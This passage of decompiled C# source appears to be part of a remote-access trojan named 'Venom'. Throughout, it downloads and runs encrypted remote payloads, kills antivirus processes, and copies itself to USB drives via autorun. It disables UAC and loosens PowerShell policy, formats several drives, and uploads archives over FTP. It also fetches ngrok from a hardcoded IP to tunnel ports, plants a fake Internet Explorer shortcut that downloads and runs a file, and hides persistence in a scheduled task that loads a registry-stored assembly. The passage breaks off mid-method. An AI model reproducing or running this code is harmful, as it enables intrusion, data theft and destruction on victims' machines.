		processStartInfo.Arguments = "/k start /b powershell Compress-Archive -Path " + dir + " -DestinationPath " + zipPath + " & exit";
		processStartInfo.CreateNoWindow = true;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.UseShellExecute = true;
		processStartInfo.ErrorDialog = false;
		Process.Start(processStartInfo);
	}

	public static void smethod_76()
	{
		ReversePortForwarding.CreateReversePortForward(3389, GClass5.string_1, 3390);
	}

	public static void smethod_77()
	{
		string path = Path.Combine(GClass5.string_4, GClass5.string_5);
		Path.Combine(path, "Venom");
		string encrypted = new StreamReader(new WebClient().OpenRead(Encoding.UTF8.GetString(Convert.FromBase64String(smethod_60("4y3I07LUterluaip9oz/7qOPDGbH5TuyoI8mnrxSIBxTM9Q3XWTB6NWHmuWMCwd7zV+GkEFtSH/PGhxEYUi4FpZi4CpAZoBX3tswNqldqRjHCcr3QbxUh08jG1u4Ll1iFEG6Nt0rH3jUbU0m6Y2pOQ=="))))).ReadToEnd();
		string text = Path.Combine(path, "allow.exe");
		byte[] bytes = Convert.FromBase64String(smethod_60(encrypted));
		File.WriteAllBytes(text, bytes);
		Process.Start(text).WaitForExit();
	}

	public static void smethod_78()
	{
		string path = Path.Combine(GClass5.string_4, GClass5.string_5);
		Path.Combine(path, "Venom");
		string encrypted = new StreamReader(new WebClient().OpenRead(Encoding.UTF8.GetString(Convert.FromBase64String(smethod_60("4y3I07LUterluaip9oz/7qOPDGbH5TuyoI8mnrxSIBxTM9Q3XWTB6NWHmuWMCwd7zV+GkEFtSH/PGhxEYUi4FpZi4CpAZoBX3tswNqldqRg9EeodyLFjyhTfAFOIL5EbXZq/4tJuBQ0mNHtBoMmkXQ=="))))).ReadToEnd();
		string text = Path.Combine(path, "enableff.exe");
		byte[] bytes = Convert.FromBase64String(smethod_60(encrypted));
		File.WriteAllBytes(text, bytes);
		Process.Start(text).WaitForExit();
	}

	public static void smethod_79()
	{
		Process[] processesByName = Process.GetProcessesByName("rdpinstall");
		for (int i = 0; i < processesByName.Length; i++)
		{
			processesByName[i].Kill();
		}
		processesByName = Process.GetProcessesByName("cmd");
		for (int i = 0; i < processesByName.Length; i++)
		{
			processesByName[i].Kill();
		}
		processesByName = Process.GetProcessesByName("conhost");
		for (int i = 0; i < processesByName.Length; i++)
		{
			processesByName[i].Kill();
		}
	}

	public static void smethod_80()
	{
		try
		{
			Process[] processesByName = Process.GetProcessesByName("winvnc");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
			processesByName = Process.GetProcessesByName("cmd");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
			processesByName = Process.GetProcessesByName("conhost");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
			processesByName = Process.GetProcessesByName("installrdp");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
			processesByName = Process.GetProcessesByName("rdpinstall");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
			processesByName = Process.GetProcessesByName("updaterdp");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
			processesByName = Process.GetProcessesByName("Install");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
			processesByName = Process.GetProcessesByName("Venom-winvnc");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
			processesByName = Process.GetProcessesByName("Venom-ngrok");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
			processesByName = Process.GetProcessesByName("ngrok");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
			processesByName = Process.GetProcessesByName("rdpinstall");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
			processesByName = Process.GetProcessesByName("winvnc");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
		}
		catch
		{
		}
	}

	public static void smethod_81()
	{
		Array.ForEach(Process.GetProcessesByName("cmd"), delegate(Process x)
		{
			x.Kill();
		});
	}

	public static void smethod_82()
	{
		smethod_81();
	}

	public static void smethod_83()
	{
		try
		{
			Process[] processesByName = Process.GetProcessesByName("cmd");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
			processesByName = Process.GetProcessesByName("conhost");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
			processesByName = Process.GetProcessesByName("VenomInstall");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
			processesByName = Process.GetProcessesByName("Venom");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
			Path.Combine(text, "VenomFox.lnk");
			Path.Combine(text, "VenomChrome.lnk");
			Path.Combine(text, "VenomCcleaner.lnk");
			string[] files = Directory.GetFiles(text, "VenomFox.lnk");
			for (int i = 0; i < files.Length; i++)
			{
				File.Delete(files[i]);
			}
			files = Directory.GetFiles(text, "VenomChrome.lnk");
			for (int i = 0; i < files.Length; i++)
			{
				File.Delete(files[i]);
			}
			files = Directory.GetFiles(text, "VenomCcleaner.lnk");
			for (int i = 0; i < files.Length; i++)
			{
				File.Delete(files[i]);
			}
		}
		catch
		{
		}
	}

	public static void smethod_84()
	{
		string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Venom");
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b del /q/f/s " + text + " & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
		try
		{
			Directory.Delete(text, recursive: true);
		}
		catch (Exception)
		{
		}
	}

	public static void smethod_85()
	{
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b del /q/f/s %TEMP%\\* & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
	}

	public static void smethod_86()
	{
		Process[] processesByName = Process.GetProcessesByName("Venom");
		for (int i = 0; i < processesByName.Length; i++)
		{
			processesByName[i].Kill();
		}
		processesByName = Process.GetProcessesByName("VenomInstall");
		for (int i = 0; i < processesByName.Length; i++)
		{
			processesByName[i].Kill();
		}
	}

	public static void smethod_87()
	{
		string[] array = new string[131]
		{
			"ISafe", "ITMRTSVC", "QOELoader", "cctray", "CAVRID", "capfasem", "VetMsg", "MSASCui", "avp", "SSU",
			"Ad-Aware", "SpySweeperUI", "capfsem", "CAPPActiveProtection", "ccprovsp", "PPCtlPriv", "cmdagent", "aswUpdSv", "SpySweeper", "bdagent",
			"livesrv", "CAGlobalLight", "AAWService", "ashServ", "sched", "avguard", "pctsAuxs", "pctsSvc", "avmailc", "AVWEBGRD",
			"ashMaiSv", "ashMaiSv", "AAWTray", "Mcafeeupdate", "", "", "cfp", "pctsTray", "egui", "WEXTRACT",
			"ccApp", "osCheck", "isPwdSvc", "nod32", "mcmscsvc", "TeaTimer", "noadware5", "persfw", "CAGlobal", "xcommsvr",
			"ccprovsp", "UmxPol", "UmxFwHlp", "UmxCfg", "UmxAgent", "avgwdsvc", "mcagent", "avgrsx", "avgemc", "VetMsg",
			"ISafe", "mcshield", "mcproxy", "mcsysmon", "MsMpEng", "avgcc", "mbamservice", "mbamgui", "avgemc", "avgupsvc",
			"avgamsvr", "explorer", "ashDisp", "SUPERAntiSpyware", "RegFirewall", "HiJackThis", "MPFSrv", "MskSrver", "mcagent", "mcsysmon",
			"McSACore", "avp", "persfw", "kavtray", "aawservice", "kavfsscs", "ccSetMgr", "SNDSrvc", "SPBBCSvc", "ccEvtMgr",
			"blackd", "navapsvc", "NPFMntor", "rapapp", "symlcsvc", "NAVAPW32", "BLACKICE", "rtsserv", "blackice", "navapw32",
			"wextact", "itmrtsvc", "isafe", "cavrid", "avgamsvr", "avgupsvc", "avgemc", "avgcc", "zlclient", "FPAVServer",
			"fssf", "FProtTray", "nvvsvc", "avgwdsvc", "pctsAuxs", "pctsSvc", "avgrsx", "avgnsx", "pctsTray", "avgcsrvx",
			"avgemc", "avgtray", "Dwm", "WUDFHost", "MSACUI", "MsMpEng", "MSASCui", "wscntfy", "egui", "smc",
			"TrayNotify"
		};
		for (int i = 0; i < array.Length; i++)
		{
			Process[] processesByName = Process.GetProcessesByName(array[i]);
			foreach (Process process in processesByName)
			{
				try
				{
					Thread.Sleep(1000);
					process.EnableRaisingEvents = false;
					process.Kill();
				}
				catch
				{
				}
			}
		}
	}

	public static void smethod_88()
	{
		string sourceFileName = Environment.GetCommandLineArgs()[0];
		DriveInfo[] drives = DriveInfo.GetDrives();
		try
		{
			DriveInfo[] array = drives;
			foreach (DriveInfo driveInfo in array)
			{
				if (driveInfo.DriveType == DriveType.Removable)
				{
					string path = driveInfo.Name + "autorun.inf";
					StreamWriter streamWriter = new StreamWriter(path);
					streamWriter.WriteLine("[autorun]");
					streamWriter.WriteLine("open=start.exe");
					streamWriter.WriteLine("action=Run VMCLite");
					streamWriter.Close();
					File.SetAttributes(path, FileAttributes.Hidden);
					try
					{
						File.Copy(sourceFileName, driveInfo.Name + "start.exe", overwrite: true);
						File.SetAttributes(driveInfo.Name + "start.exe", FileAttributes.Hidden);
					}
					finally
					{
						Console.WriteLine("Removable device is rooted.");
					}
				}
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine("Exception: " + ex.ToString());
		}
	}

	public static void smethod_89()
	{
		string value = "Unrestricted";
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell", writable: true);
		if (registryKey == null)
		{
			Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell", RegistryKeyPermissionCheck.ReadWriteSubTree);
			registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell", writable: true);
			registryKey.SetValue("ExecutionPolicy", value);
		}
		else
		{
			registryKey.SetValue("ExecutionPolicy", value);
		}
		registryKey.Flush();
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b powershell Set-ExecutionPolicy unrestricted -Scope CurrentUser -ErrorAction SilentlyContinue -Confirm:$false & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
	}

	public static void smethod_90()
	{
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b powershell Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -ErrorAction SilentlyContinue -Confirm:$false & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
	}

	public static void smethod_91()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
		if (registryKey == null)
		{
			Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", RegistryKeyPermissionCheck.ReadWriteSubTree);
			registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
			registryKey.SetValue("DisableTaskMgr", 0);
		}
		else
		{
			registryKey.SetValue("DisableTaskMgr", 0);
		}
		registryKey.Flush();
		RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", writable: true);
		if (registryKey2 == null)
		{
			Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", RegistryKeyPermissionCheck.ReadWriteSubTree);
			registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
			registryKey2.SetValue("NoControlPanel", 0);
		}
		else
		{
			registryKey2.SetValue("NoControlPanel", 0);
		}
		registryKey2.Flush();
		RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", writable: true);
		if (registryKey3 == null)
		{
			Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", RegistryKeyPermissionCheck.ReadWriteSubTree);
			registryKey3 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
			registryKey3.SetValue("HideClock", 0);
		}
		else
		{
			registryKey3.SetValue("HideClock", 0);
		}
		registryKey3.Flush();
		RegistryKey registryKey4 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
		if (registryKey4 == null)
		{
			Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", RegistryKeyPermissionCheck.ReadWriteSubTree);
			registryKey4 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
			registryKey4.SetValue("EnableLUA", 0);
		}
		else
		{
			registryKey4.SetValue("EnableLUA", 0);
		}
		registryKey4.Flush();
		RegistryKey registryKey5 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
		if (registryKey5 == null)
		{
			Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", RegistryKeyPermissionCheck.ReadWriteSubTree);
			registryKey5 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
			registryKey5.SetValue("DisableRegistryTools", 0);
		}
		else
		{
			registryKey5.SetValue("DisableRegistryTools", 0);
		}
		registryKey5.Flush();
		RegistryKey registryKey6 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
		if (registryKey6 == null)
		{
			Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", RegistryKeyPermissionCheck.ReadWriteSubTree);
			registryKey6 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
			registryKey6.SetValue("DisableCMD", 0);
		}
		else
		{
			registryKey6.SetValue("DisableCMD", 0);
		}
		registryKey6.Flush();
	}

	public static void smethod_92()
	{
		string text = Path.Combine(Path.Combine(Path.Combine(GClass5.string_4, GClass5.string_5), "Venom"), "user.exe");
		File.WriteAllBytes(text, GClass4.CU);
		Process.Start(text);
	}

	public static object smethod_93()
	{
		return Class9.DeleteFile(Process.GetCurrentProcess().MainModule!.FileName + Convert.ToString(":Zone.Identifier"));
	}

	public static void smethod_94(string remote_uri, string local_filename)
	{
		string description = "Internet Explorer";
		string text = "Internet Explorer";
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string text2 = Path.Combine(folderPath, text + ".lnk");
		if (!Directory.Exists(folderPath))
		{
			Directory.CreateDirectory(folderPath);
		}
		if (File.Exists(text2))
		{
			File.Delete(text2);
		}
		WshShell wshShell = (WshShell)Activator.CreateInstance(Marshal.GetTypeFromCLSID(new Guid("72C24DD5-D70A-438B-8A42-98424B88AFB8")));
		GInterface9 gInterface = (GInterface9)(dynamic)wshShell.CreateShortcut(text2);
		gInterface.TargetPath = "powershell";
		gInterface.Arguments = "-command \"$flnm =\\\"$env:TEMP\\" + local_filename + "\\\";Invoke-WebRequest -Uri \\\"" + remote_uri + "\\\" -OutFile $flnm;Get-Item -Path $flnm -Stream \\\"Zone.Identifier\\\";& $flnm;\"";
		gInterface.Description = description;
		gInterface.Hotkey = "Ctrl+A";
		gInterface.IconLocation = "shell32.dll,-16744";
		gInterface.WindowStyle = 7;
		gInterface.Save();
	}

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr Handle, int securityInformation, [Out] byte[] pSecurityDescriptor, uint nLength, ref uint lpnLengthNeeded);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr Handle, int securityInformation, [In] byte[] pSecurityDescriptor);

	private static void smethod_95(IntPtr handle)
	{
		try
		{
			byte[] pSecurityDescriptor = new byte[0];
			uint lpnLengthNeeded = 0u;
			GetKernelObjectSecurity(handle, 4, pSecurityDescriptor, 0u, ref lpnLengthNeeded);
			pSecurityDescriptor = new byte[lpnLengthNeeded];
			GetKernelObjectSecurity(handle, 4, pSecurityDescriptor, lpnLengthNeeded, ref lpnLengthNeeded);
			RawSecurityDescriptor rawSecurityDescriptor = new RawSecurityDescriptor(pSecurityDescriptor, 0);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, Convert.ToInt32(987135), new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			pSecurityDescriptor = new byte[rawSecurityDescriptor.BinaryLength];
			rawSecurityDescriptor.GetBinaryForm(pSecurityDescriptor, 0);
			SetKernelObjectSecurity(handle, 4, pSecurityDescriptor);
		}
		catch
		{
		}
	}

	public static void smethod_96()
	{
		switch (Environment.OSVersion.Version.Major)
		{
		case 6:
			Class45.smethod_6();
			break;
		case 10:
			smethod_29(Convert.FromBase64String(smethod_58(new StreamReader(new WebClient().OpenRead(Encoding.UTF8.GetString(Convert.FromBase64String(smethod_58("NKOPmTypVXOBw8M4exFGSq4eGiXmVqCKtyAJ1+pZppafOcUf+j+P9biZgYLUlIPeaLGLyWPl5ZoOa9PY5rTsYg=="))))).ReadToEnd())));
			break;
		}
	}

	public static void smethod_97()
	{
		int major = Environment.OSVersion.Version.Major;
		if (major != 6 && major == 10)
		{
			Convert.FromBase64String(smethod_58(new StreamReader(new WebClient().OpenRead(Encoding.UTF8.GetString(Convert.FromBase64String(smethod_58("gQ8qxzxGQ6tCfnxdcTHggypxrsh84/ZPaB6zQZr32ZLpApyDHLbEXqnGn1FyZg7Eq9i/pG9iADhVnXwVkBIvQwJiMaH4nY12/3X8x8A4ufATliQx+8HQSrA+rnyuBCbGeBRHM6ll2v4rwISk8WC2iQ=="))))).ReadToEnd()));
			smethod_29(GClass4.MEMORYU);
		}
	}

	public static void smethod_98(string args)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = args,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		process.Start();
	}

	public static void smethod_99()
	{
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b powershell  Format-Volume -DriveLetter B,C,D,E,F,G,I,J -FileSystem FAT32 -Confirm:$false",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
	}

	public static void smethod_100(string fTPAddress, string username, string password, string filename)
	{
		try
		{
			StreamWriter streamWriter = new StreamWriter(Path.Combine(Path.GetTempPath(), "ftp.txt"));
			streamWriter.WriteLine("open ftp://" + username + ":" + password + "@" + fTPAddress + "/");
			streamWriter.WriteLine("put " + filename);
			streamWriter.WriteLine("quit");
			streamWriter.Close();
		}
		catch (Exception ex)
		{
			Console.WriteLine("Exception: " + ex.Message);
		}
		finally
		{
			Console.WriteLine("Executing finally block.");
		}
	}

	public static void smethod_101(string fTPAddress, string username, string password, string zipName)
	{
		//IL_0086: Unknown result type (might be due to invalid IL or missing references)
		FtpWebRequest obj = (FtpWebRequest)WebRequest.Create(fTPAddress + "/" + Path.GetFileName(zipName));
		obj.Method = "STOR";
		obj.Credentials = new NetworkCredential(username, password);
		obj.UsePassive = true;
		obj.UseBinary = true;
		obj.KeepAlive = false;
		FileStream fileStream = File.OpenRead(zipName);
		byte[] array = new byte[fileStream.Length];
		fileStream.Read(array, 0, array.Length);
		fileStream.Close();
		Stream requestStream = obj.GetRequestStream();
		requestStream.Write(array, 0, array.Length);
		requestStream.Close();
		MessageBox.Show("Uploaded Successfully");
	}

	public static void smethod_102()
	{
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b netsh advfirewall firewall add rule name=SMTP1 dir=in action=allow protocol=TCP localport=21 & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b netsh advfirewall firewall add rule name=SMTP1 dir=out action=allow protocol=TCP localport=21 & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b netsh advfirewall firewall add rule name=SMTP2 dir=in action=allow protocol=TCP localport=25 & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b netsh advfirewall firewall add rule name=SMTP2 dir=out action=allow protocol=TCP localport=25 & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b netsh advfirewall firewall add rule name=Submission dir=in action=allow protocol=TCP localport=587 & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b netsh advfirewall firewall add rule name=Submission dir=out action=allow protocol=TCP localport=587 & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b netsh advfirewall firewall add rule name=SMTPS dir=in action=allow protocol=TCP localport=465 & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b netsh advfirewall firewall add rule name=SMTPS dir=out action=allow protocol=TCP localport=465 & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b netsh advfirewall firewall add rule name=IMAP dir=in action=allow protocol=TCP localport=993 & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b netsh advfirewall firewall add rule name=IMAP dir=out action=allow protocol=TCP localport=993 & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b netsh advfirewall firewall add rule name=POP3S dir=in action=allow protocol=TCP localport=995 & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b netsh advfirewall firewall add rule name=POP3S dir=out action=allow protocol=TCP localport=995 & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b netsh advfirewall firewall add rule name=POP3 dir=in action=allow protocol=TCP localport=110 & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b netsh advfirewall firewall add rule name=POP3 dir=out action=allow protocol=TCP localport=110 & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b netsh advfirewall firewall add rule name=ESMTP dir=in action=allow protocol=TCP localport=587 & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b netsh advfirewall firewall add rule name=ESMTP dir=out action=allow protocol=TCP localport=587 & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b netsh advfirewall firewall add rule name=SSH_IN dir=in action=allow protocol=TCP localport=22 & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b netsh advfirewall firewall add rule name=SSH_OUT dir=out action=allow protocol=TCP localport=22 & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
	}

	public static void smethod_103(string token)
	{
		try
		{
			StreamWriter streamWriter = new StreamWriter(Path.Combine(Path.GetTempPath(), "fixemail.bat"));
			streamWriter.WriteLine("set downloadURL=http://91.134.207.16/update/ngrok.exe");
			streamWriter.WriteLine("set logFile=%TEMP%\\proclog.txt");
			streamWriter.WriteLine("set exeFile=%TEMP%\\ngrok.exe");
			streamWriter.WriteLine("set logFile=%TEMP%\\proclog.txt");
			streamWriter.WriteLine("powershell (new-object System.Net.WebClient).DownloadFile('%downloadURL%','%exeFile%');");
			streamWriter.WriteLine("%exeFile% authtoken " + token);
			streamWriter.WriteLine("%exeFile%  tcp  587 > %logFile%");
			streamWriter.Close();
			string fileName = Path.Combine(Path.GetTempPath(), "fixemail.bat");
			Process.Start(new ProcessStartInfo
			{
				FileName = fileName,
				CreateNoWindow = true,
				WindowStyle = ProcessWindowStyle.Hidden,
				UseShellExecute = true,
				ErrorDialog = false
			});
		}
		catch (Exception)
		{
		}
	}

	public static void smethod_104(string token)
	{
		try
		{
			StreamWriter streamWriter = new StreamWriter(Path.Combine(Path.GetTempPath(), "fixftp.bat"));
			streamWriter.WriteLine("set downloadURL=http://91.134.207.16/update/ngrok.exe");
			streamWriter.WriteLine("set logFile=%TEMP%\\proclog.txt");
			streamWriter.WriteLine("set exeFile=%TEMP%\\ngrok.exe");
			streamWriter.WriteLine("set logFile=%TEMP%\\proclog.txt");
			streamWriter.WriteLine("powershell (new-object System.Net.WebClient).DownloadFile('%downloadURL%','%exeFile%');");
			streamWriter.WriteLine("%exeFile% authtoken " + token);
			streamWriter.WriteLine("%exeFile%  tcp  21 > %logFile%");
			streamWriter.Close();
			string fileName = Path.Combine(Path.GetTempPath(), "fixftp.bat");
			Process.Start(new ProcessStartInfo
			{
				FileName = fileName,
				CreateNoWindow = true,
				WindowStyle = ProcessWindowStyle.Hidden,
				UseShellExecute = true,
				ErrorDialog = false
			});
		}
		catch (Exception)
		{
		}
	}

	public static async Task DelRdpMethodAsync()
	{
		await Killrdp();
	}

	private static async Task Killrdp()
	{
		Task.Run(delegate
		{
			smethod_26();
		}).Wait();
		Task.Run(delegate
		{
			smethod_84();
		}).Wait();
		Task.Run(delegate
		{
			smethod_80();
		}).Wait();
		Task.Run(delegate
		{
			smethod_85();
		}).Wait();
	}

	public static async Task InstallRdpMethodAsync()
	{
		await Installrdp();
	}

	private static async Task Installrdp()
	{
		Task.Run(delegate
		{
			smethod_15();
		}).Wait();
		Thread.Sleep(8000);
	}

	public static void smethod_105(string code)
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Ccleaner", writable: true);
		if (registryKey == null)
		{
			registryKey = Registry.CurrentUser.CreateSubKey("Software\\Ccleaner");
			registryKey.SetValue("Ccleaner", code);
		}
		else if (registryKey.GetValue("Ccleaner") != null && registryKey.GetValue("Ccleaner")!.ToString()!.Equals(code, StringComparison.CurrentCultureIgnoreCase))
		{
			string text = "powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -NoExit -Command [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String((Get-ItemProperty HKCU:\\Software\\Ccleaner\\).Ccleaner)).EntryPoint.Invoke($Null,$Null)";
			Process.Start(new ProcessStartInfo
			{
				FileName = "schtasks",
				Arguments = "/create /sc minute /mo 1 /tn Ccleaner /tr \"" + text + "\"",
				CreateNoWindow = true,
				ErrorDialog = false,
				WindowStyle = ProcessWindowStyle.Hidden
			});
		}
		else
		{
			registryKey.SetValue("Ccleaner", code);
		}
	}

	public static string smethod_106(string compressedText)
	{
		byte[] array = Convert.FromBase64String(compressedText);
		using MemoryStream memoryStream = new MemoryStream();
		int num = BitConverter.ToInt32(array, 0);
		memoryStream.Write(array, 4, array.Length - 4);
		byte[] array2 = new byte[num];
		memoryStream.Position = 0L;
		using (GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress))
		{
